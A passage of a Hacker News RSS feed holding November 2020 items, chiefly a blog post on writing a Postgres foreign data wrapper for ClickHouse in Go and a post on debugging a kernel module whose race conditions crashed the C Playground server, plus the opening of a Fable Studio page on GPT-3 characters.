            <pubDate>Thu, 19 Nov 2020 20:42:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egui: Experimental immediate mode GUI library written in Rust]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25153975">thread link</a>) | @Jarred
<br/>
November 19, 2020 | https://emilk.github.io/egui/index.html | <a href="https://web.archive.org/web/*/https://emilk.github.io/egui/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://emilk.github.io/egui/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153975</guid>
            <pubDate>Thu, 19 Nov 2020 20:30:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Postgres Foreign Data Wrapper for Clickhouse in Go]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25153782">thread link</a>) | @arunk-s
<br/>
November 19, 2020 | https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/ | <a href="https://web.archive.org/web/*/https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p><a href="https://www.postgresql.org/">Postgres</a>(hereinafter mentioned as PG) is a pretty cool database with lots of nice features, one of them little known ones is the ability of having Foreign data wrappers <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">(hereinafter mentioned as FDWs)</a>.</p>

<p><a href="https://clickhouse.tech/">Clickhouse</a>(hereinafter mentioned as CH) is another amazing database with an altogether different set of features targeted for OLAP use cases.</p>

<h2 id="what-are-foreign-data-wrappers-fdws-then">What are Foreign Data Wrappers (FDWs) then?</h2>

<p>Well unlike so many names in tech, we can actually infer some idea from the name itself in this case.
So FDWs in essence, allows to access <em>foreign</em> <em>data</em> sources inside Postgres(PG) via a set of <a href="https://www.postgresql.org/docs/current/fdwhandler.html">wrapper APIs</a>.</p>

<p>That is, you can access data sitting in a Mysql/SQlite/Clickhouse(<em>any other data source</em>) table inside PG as you would do for a normal PG table. Isnâ€™t that amazing!</p>

<p>There are already numerous such FDWs. A list is available <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">here</a>.</p>

<p>One caveat is that the extent of features you can expect from a FDW is dependent on the particular implementation.
We can expect normal read support but other niceties like push-down filters, aggregations or joins, or write support can be missing.</p>

<h2 id="accessing-clickhouse-ch-via-postgres-pg">Accessing Clickhouse(CH) via Postgres(PG)</h2>

<p>Given the existence of so many possibilities of accessing other datastores, wouldnâ€™t it be fun if we could access Clickhouse from inside Postgres.</p>

<p>Why would you want to do it! you may ask.</p>

<p>Well one reason could be of course, for <em>fun</em>.</p>

<p>But more realistically, one of the ambitious use cases at <a href="https://messagebird.com/">MessageBird</a>(my employer) was the ability to connect Clickhouse to <a href="https://looker.com/">Looker</a> as no direct integration existed at that time.
It was a bit of a moonshot but we decided to give it a try to see if it would work :)</p>

<p>MessageBird has generously made the full source for our experiment open source! The repository is available <a href="https://github.com/messagebird/clickhouse-postgres-fdw">here</a>.
So you can reference the ideas mentioned in the blog post directly in the code as well :)</p>

<h3 id="now-on-to-writing-one-fdw">Now on to writing one FDW!</h3>

<p>There are already <a href="https://www.postgresql.org/docs/current/fdwhandler.html">documentations</a> on how we should approach this and some simple examples are also available on Github. Most of the full fledged FDWs have their code in open so we can consult them as well.
Note that most of them are written in C becauses the FDW API of PG is in C, which makes sense.
I should highlight one particular <a href="https://github.com/pgspider/sqlite_fdw">FDW</a> that is made for SQLite and has a solid feature set, which helped me a lot while writing the one for Clickhouse.</p>

<p>But what if we want to be adventurous and write one in Go? Well, it should be possible given the existence of <a href="https://golang.org/cmd/cgo/">CGo</a>.</p>

<p>We can expect that it will not be at all trivial. ;)
There are already attempts on making Postgres Extensions in <a href="https://github.com/liztio/k8s-fdw">Go</a>, which gives a very valuable insight.</p>

<h4 id="setting-up-the-build-process-and-interaction-between-go-and-postgres-c-api">Setting up the build process and interaction between Go and Postgres C API</h4>

<p>First we should familiarize ourselves with the <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PG Extension Build Infrastructure/PGXS</a> and how to write <a href="https://www.postgresql.org/docs/current/xfunc-c.html#DFUNC">C code</a> for PG.
These are crucial as we would want to integrate the C code with Go, and knowing how the build process works should help us in understanding where our code will fit.</p>

<p>For writing a FDW we have to provide an entry point in form of a <code>struct</code> containing function pointers to the implemented callback functions.
Since we want to write those callback in Go, we can consult documentation for <a href="https://golang.org/cmd/cgo/#hdr-C_references_to_Go">accessing Go functions in C</a>, which says there are specific annotations that should allow us to export go functions outside to the C code.
All the important work is done in these callbacks only.<br>
Now it should be possible to add functions that PG FDW API expects via Go.</p>

<p>But, how will the C code find the callback functions written in Go land ? <a href="https://golang.org/cmd/go/#hdr-Build_modes">Go build modes</a> is the answer.
Directly referencing from the documentation, the <code>-buildmode=c-archive</code> allows us to:</p>

<pre><code>Build the listed main package, plus all packages it imports,
into a C archive file. The only callable symbols will be those
functions exported using a cgo //export comment. Requires
exactly one main package to be listed.
</code></pre>

<p>Perfect! Now, the exported Go functions are available in the <a href="https://linux.die.net/man/1/ar">archive file</a>.
The only remaining thing is to link the archive with C code during build.
Thankfully, <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PGXS</a> provides a <code>Make</code> variable <code>SHLIB_LINK</code> that can be used to set the shared library used. So weâ€™ll use that flag to provide the archive build from Go source files.</p>

<p>You can see it in action <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/Makefile">here</a>.</p>

<!-- * how linking go code to c via statically linked libraries works ? .a files linking with Go. -->

<!-- And we want a library of sorts which should be callable inside C code. For this we can use go build mode (c-archive), this will create a statically linked archive(see difference btwn shared objects and statically linked libraries and how to build them) -->

<h4 id="understanding-inner-working-of-the-fdw-api-and-their-relation-with-different-query-stages">Understanding inner working of the FDW API and their relation with different Query Stages</h4>

<!-- * Figuring out which stages do what, what do you want and where to look for them -->

<p>To actually write a working FDW, we need to familiarize with the different stages a query goes through in PG and how the API functions play them out.
Postgres has an excellent documentation and moreover since all the <a href="https://github.com/messagebird/clickhouse-postgres-fdw/">source code</a> is open, we can just navigate through the code as well!</p>

<p>It would take more space than a blog post to explain the full internals of Query planner in Postgres and I probably canâ€™t describe it well enough.
So, I suggest to go through <a href="https://www.postgresql.org/docs/current/fdw-callbacks.html">the official documentation</a> which is quite excellent and there are many other excellent references on the web.</p>

<p>Iâ€™ll try to briefly explain the flow of the API functions for the context of this post.
A very basic plan looks like this:</p>

<pre><code>+-------------------------+
|                         |
|                         |
|    GetForeignRelSize    |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     GetForeignPaths     |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     GetForeignPlan      |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     BeginForeignScan    |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|    IterateForeignScan   |
|                         |
|                         |
+-------------------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     EndForeignScan      |
|                         |
|                         |
+-------------------------+

</code></pre>

<p>There are other functions in the FDW API that Iâ€™ve omitted here (like <code>ReScanForeignScan</code>, <code>AnalyzeForeignTable</code>, <code>GetForeignUpperPaths</code>) but a basic FDW can be done with these.
Also note that this path is only concerned with the read queries. To enable writing on the foreign database, there are separate functions that need to be implemented.
You can see how the read path is implemented for our clickhouse FDW <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/ch_fdw.c">here</a>.</p>

<p>Important ones to take note of to properly implement the read path of a query are:</p>

<ul>
<li><p>GetForeignRelSize: It should be used to determine the estimated number of rows to be scanned on the foreign server. However, it is also used to extract the restriction clauses present in the query presented by PG and to pass them to the foreign server if it can support them.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L180">example</a>.</p></li>

<li><p>GetForeignPlan: It should return the planner node(a data structure that contains the query plan). However, it is also used to extract the target columns that can be fetched from remote/foreign servers and pass that info along with restriction clauses, table names to the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L275">example</a>.</p></li>

<li><p>BeginForeignScan: It should perform the initalization that is needed to perform the scan on the foreign server, for example: initialize the foreign DB connection, formalize the query running on foreign server and init the state with row iterator to be used in the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L508">example</a>.</p></li>

<li><p>IterateForeignScan: It should return a row from the foreign server converted to the PG specific structure. This function should convert the foreign server specific data types to PG column data types.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L620">example</a>.</p></li>

<li><p>EndForeignScan: It should clean the state being stored for the query, like row iterators, db connections should be closed.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L760">example</a>.</p></li>
</ul>

<p>This is a very dense overview of the functionality of a <em>basic</em> FDW. It usually helps to look around the other FDWs that are open source to look for ideas of a sample implementation. But it can differ since the foreign server can be of various types.
Usually, if we take databases that support some dialect of SQL then the hardest things are usually figuring out if the restriction clauses are remote safe, which can involve parsing the full expression clauses and then converting them to remote variants.
Converting the foreign server datatypes to PG types is comparatively easy but is very toiling.</p>

<p>You can look into how <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go">clickhouse FDW</a> does this to get an idea, but beware that it could be bug prone, since it hasnâ€™t been tested thoroughly.</p>

<p>Iâ€™ll also suggest getting an idea of commonly used PG datatypes and conventions like <code>OID</code>, <code>Tuple</code>, <code>RelOptInfo</code> or just going over <a href="https://doxygen.postgresql.org/relation_8h.html"><code>relation.h</code></a> reference from PG source code.</p>

<h3 id="few-tips-and-tricks">Few Tips and Tricks</h3>

<p>These are some ideas that Iâ€™ve seen are fairly used while developing a FDW. Some can help in easy interop between Go and C, whether it is a good idea or not, is up for debate ;)</p>

<h4 id="interfacing-c-macros-within-go">Interfacing C macros within Go</h4>

<p>There are a lot of internal macros in PG source which makes it easier to access system cache, lists, heap tuples etc. which arenâ€™t directly callable from Goâ€™s userland.<br>
This is because CGo doesnâ€™t quite allow directly calling C <code>#define</code> macros.<br>
You can try to simulate the same behaviour using underlying constructs but that can get hairy and cumbersome. Instead one <em>easy</em> idea is to define simple C wrapper functions like</p>

<pre><code>void *wrapper_access_list(void *list, int index){
	return access_list(list, index);
}
</code></pre>

<p>This can now be used directly on Go side. But make sure you cast the results to proper types.</p>

<h4 id="moving-out-c-code">Moving out C code</h4>

<p>There can be a point where writing C code directly in Go source files is not feasible â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/">https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/</a></em></p>]]>
            </description>
            <link>https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153782</guid>
            <pubDate>Thu, 19 Nov 2020 20:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My First Kernel Module: A Debugging Nightmare]]>
            </title>
            <description>
<![CDATA[
Score 123 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25153388">thread link</a>) | @ksml
<br/>
November 19, 2020 | https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html | <a href="https://web.archive.org/web/*/https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This is the story of the time I wrote some code, deployed it to production, and
ended up bricking the server it was running on by frying the kernel.</p>

<figure>
    <a href="https://reberhardt.com/blog//images/my-first-kernel-module/frying-pan.jpg">
        <img src="https://reberhardt.com/blog//images/my-first-kernel-module/frying-pan.jpg" alt="Beautiful rendition of me frying the kernel">
    </a>
    
    <figcaption>Beautiful rendition of me frying the kernel</figcaption>
    
</figure>

<p>This post is about perils of concurrency and race conditions.  My code was
nearly correct, but ultimately, there were two major synchronization bugs that
killed it.</p>

<!--more-->

<p>This is a really long post that gets into the weeds at times, but I have tried
to write it so that you can jump into any section and hopefully learn something
from it:</p>

<ul>
  <li><a href="#a-nightmare-begins">A nightmare begins</a>: How I discovered this issue and
initially triaged it</li>
  <li><a href="#context-c-playground-visual-debugger">Context: C Playground visual
debugger</a>: How Linux <code>/proc</code> files
work, and how Linux stores process and open file information. I drew some
spiffy diagrams so you can visualize how this works!</li>
  <li><a href="#the-debugging-process">The debugging process</a>: How I attempted to track
down the bug(s)
    <ul>
      <li><a href="#finding-a-footing">Finding a footing</a></li>
      <li><a href="#red-herrings">Red herrings</a></li>
      <li><a href="#the-processes-smell-fishy">The processes smell fishy</a></li>
      <li><a href="#desperation-and-the-start-of-progress">Desperation, and the start of progress</a></li>
      <li><strong><a href="#rcu-read-copy-update">RCU: Read, Copy, Update</a>: The cause of (and fix for) my first bug</strong></li>
      <li><a href="#fix-1-dont-block-in-critical-sections">Fix #1: Donâ€™t block in critical sections</a></li>
      <li><a href="#the-emotional-rollercoaster-continues">The emotional rollercoaster continues</a></li>
      <li><a href="#fix-2-rebuilding-the-kernel">Fix #2: Rebuilding the kernel</a></li>
    </ul>
  </li>
  <li><a href="#conclusion">Conclusion</a>: Takeaways and lessons learned</li>
</ul>

<p><strong>Looking for a quick read?</strong> Skip to the <a href="#rcu-read-copy-update">RCU: Read, Copy,
Update</a> section for spoilers.</p>

<p>In this post, I assume you have some understanding of how files and concurrency
work on Unix systems. I will try to explain everything else!</p>

<h2 id="a-nightmare-begins">A nightmare begins</h2>

<p>I have been working on building a <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">graphical debugger for C Playground</a> for
some time, allowing users to run code in the browser and visualize how their
program is being executed. As part of this work, I had to implement a kernel
module. (Iâ€™ll explain more about this project in the next section.) After
testing the code locally for a few months, I pushed it to production.</p>

<p>The next morning, I woke up to a text from my roommate: <em>â€œI think the server
crashed.â€</em> Uh oh, thatâ€™s not supposed to happen. I quickly pulled out my laptop
and tried to SSH into the server to pull the logs, but to my surprise, I
couldnâ€™t reach the server:</p>

<div><div><pre><code>ssh: connect to ... port 22: Operation timed out
</code></pre></div></div>

<p>Something wasnâ€™t right. I logged into DigitalOcean to restart the machine, but
while I was doing that, I noticed a spike in the serverâ€™s CPU usage graph
around the time my roommate texted me. The CPU was cleanly pegged at 100%.
Normally, if a process running on the machine is hogging the CPU, we should
expect to see slight fluctuations around 100%, but that was not the case here
â€“ it was a clean, horizontal line.</p>

<figure>
    <a href="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png">
        <img src="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png" alt="">
    </a>
    
</figure>

<p>After force-restarting the server via DigitalOcean and rolling back the
debugging feature, I started going through logs to get a sense for what
happened. My kernel module has print statements, and these get saved to the
kernelâ€™s log in <code>/var/log/kern.log</code>. I scanned through this file, hoping to
find some clues, but this only confused me even more; there was <em>nothing</em> in
the kernel logs from any time near when the server locked up. It seemed to
suggest my kernel module wasnâ€™t even running at that time. But I felt it <em>had</em>
to be a problem with my kernel module: nothing in user space could cause a
computer to lock up the way it did, completely unresponsive and pegged at 100%
CPU.</p>

<p>I kept digging. If the kernel logs didnâ€™t give me anything helpful, maybe there
might be some application-side records that would indicate what happened.
However, when I checked the C Playground log file, I felt things only getting
worse:</p>

<div><div><pre><code>[2020-03-25T14:47:00-0400] [INFO]   [p5wDiTxoeX4hdYwDAAEm] Websocket connection received from &lt;redacted&gt;
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Program is at alias lion-eland-echidna
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Run logged with ID 55229
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Saving code to /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Successfully created gdb socket at /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8-gdb.sock
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Starting container: docker run -it --name dfb5e628-595f-464d-a4dd-1559db7b78d8 --read-only --tmpfs /cplayground:mode=0777,size=32m,exec -v /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8:/cplayground/code.cpp:ro -v /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8-include.zip:/cplayground/include.zip:ro -e COMPILER=g++ -e CFLAGS=-g -std=c++17 -O0 -Wall -no-pie -lm -pthread -e SRCPATH=/cplayground/code.cpp --cap-drop=all --memory 96mb --memory-swap 128mb --memory-reservation 32mb --cpu-shares 512 --pids-limit 16 --ulimit cpu=10:11 --ulimit nofile=64 --network none -v /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8-gdb.sock:/gdb.sock --cap-add=SYS_PTRACE -e CPLAYGROUND_DEBUG=1 cplayground /run.py
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Initial terminal size 80x24
[2020-03-25T14:47:01-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Resize info received: 17x74
[2020-03-25T14:47:01-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Resize info received: 17x75
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
&lt;truncated for brevity&gt;
</code></pre></div></div>

<p>What on earth is <em>that</em>???</p>

<p>After some Googling, I figured out that <code>^@</code> is how <code>less</code> displays null bytes.
So, my log file is filled with null bytes. Why would that be?</p>

<p>Then it occurred to me: Filesystem writes arenâ€™t synchronous. When a program
writes to a file, the data is usually not immediately written to disk. Instead,
to improve performance, the data is written to a buffer in memory. Normally,
the kernel flushes this buffer to disk periodically, so that the data is
persisted. But if the kernel is incapacitated, there is no way the data can
reach the disk, and when the machine force-restarts, it is lost forever. From
the above output, I could see that parts of the logs made it to disk, but later
parts of the logs were not so lucky, appearing as scrambled null bytes instead.</p>

<p>I started to feel a sense of dread creeping in. This was reminding me of the
extremely late nights and brain-frying debugging sessions from that time I took
an operating systems class. Except this might be even worse: This problem is
<em>only</em> happening in production, and I canâ€™t reproduce it, and I canâ€™t get any
logs to explain whatâ€™s wrong.</p>

<p>In the next section, Iâ€™ll explain what my kernel module was doing, so that you
can follow along with my debugging process. Then, in the last section, Iâ€™ll
talk you through the long, long process I went through to identify the <em>two</em>
bugs that caused this problem. (Spoiler alert: there were two race conditions
that caused two use-after-frees, in which I attempted to use memory after it
had already been freed.)</p>

<h2 id="context-c-playground-visual-debugger">Context: C Playground Visual Debugger</h2>

<p>I have been working on <a href="https://cplayground.com/">C Playground</a> for some time,
which is an online sandbox for quickly testing out C and C++ code. It is
specifically designed for learning systems programming, and I have been working
on features that generate diagrams to illustrate what is happening under the
hood when you run code on a computer.</p>

<p>Most recently, I was working on generating diagrams of the data structures that
the kernel uses to keep track of a programâ€™s open files. The context and
motivation for this are described in much more detail in <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">this blog
post</a>.
As a very brief summary, this feature aims to help students understand system
calls such as <code>open</code>, <code>close</code>, <code>dup2</code>, <code>fork</code>, <code>pipe</code>, and others. Using these
system calls requires an understanding of what they are doing on your behalf.
Usually, we explain these system calls in terms of the <em>vnode table</em>, which
caches information about files on the system, the <em>open file table</em>, which
stores <em>session</em> information (e.g. program X has file Y open for reading, and
has read 100 bytes so far), and the <em>file descriptor table</em>, which stores
pointers into the open file table indicating which sessions a process has open.</p>

<p>When teaching these concepts, we typically draw a lot of diagrams by hand. C
Playground aims to generate diagrams automatically, helping students to build
up and confirm their intuitions without needing access to a TA. The platform
allows students to set breakpoints and step through â€¦</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html">https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html</a></em></p>]]>
            </description>
            <link>https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153388</guid>
            <pubDate>Thu, 19 Nov 2020 19:30:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Giving Characters Life with GPT3]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25153289">thread link</a>) | @frankcarey
<br/>
November 19, 2020 | https://fable-studio.com/behind-the-scenes/ai-generation | <a href="https://web.archive.org/web/*/https://fable-studio.com/behind-the-scenes/ai-generation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5f9c97762725f32ff02f0613" id="sections">
  
    <section data-section-id="5f9c97762725f32ff02f0615" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;customSectionHeight&quot;: 10,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;white&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5f9c97762725f32ff02f060f"><div><div><div data-block-json="{&quot;blockAnimation&quot;:&quot;none&quot;,&quot;layout&quot;:&quot;caption-below&quot;,&quot;overlay&quot;:false,&quot;description&quot;:{&quot;html&quot;:&quot;<p class=\&quot;\&quot; style=\&quot;white-space:pre-wrap;\&quot;>Lucy is the charmed hero of Neil Gaiman &amp;amp; Dave McKean\u2019s <em>Wolves in the Walls</em>, adapted by Fable. The dialogue in this video was generated by Artificial Intelligence. </p>&quot;,&quot;raw&quot;:false},&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;<iframe src=\&quot;https://player.vimeo.com/video/471505831?app_id=122963&amp;amp;wmode=opaque\&quot; width=\&quot;426\&quot; height=\&quot;240\&quot; frameborder=\&quot;0\&quot; allow=\&quot;autoplay; fullscreen\&quot; allowfullscreen=\&quot;\&quot; title=\&quot;Fable - AI Generated Episode 1\&quot;></iframe>&quot;,&quot;url&quot;:&quot;https://vimeo.com/471505831/664bd00858&quot;,&quot;thumbnailUrl&quot;:&quot;https://i.vimeocdn.com/video/984156173_295x166.jpg&quot;,&quot;resolvedBy&quot;:&quot;vimeo&quot;}" data-block-type="32" id="block-yui_3_17_2_1_1604099397066_3873"><div><div><p>Lucy is the charmed hero of Neil Gaiman &amp; Dave McKeanâ€™s <em>Wolves in the Walls</em>, adapted by Fable. The dialogue in this video was generated by Artificial Intelligence. </p></div></div></div><div data-block-type="2" id="block-903ca1e9a8682cce8ca6"><div><p>At Fable, weâ€™re building next-generation AI to create interactive stories with what weâ€™re calling â€œVirtual Beings.â€&nbsp;</p><p>As creators at the fore of this exciting new space, where AI is both a tool and an art-form, weâ€™ve seen that if we remove the artist and rely completely on generative AI, it inevitably goes off the rails and delivers underwhelming results. While there are many entertaining examples of both profound and ridiculous sentences generated by AI on the internet, these responses are very unpredictable and the feeling of having a natural conversation is quickly lost.</p><p>Natural conversations are not like talking to Siri or your smart speaker either. There, the relationship is a transactional one with the AI only focused on solving an immediate request from you. Very little context is carried between interactions so they have no emotional intelligence, making them frustrating to interact with. Instead, we humans should be better represented within an AIâ€™s brain. It should have memories of us and our conversations and continue that shared context into future conversations. It should anticipate us instead of just reacting to us. In short, whatâ€™s missing is that you should feel â€œseenâ€.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1605570854118_5574"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
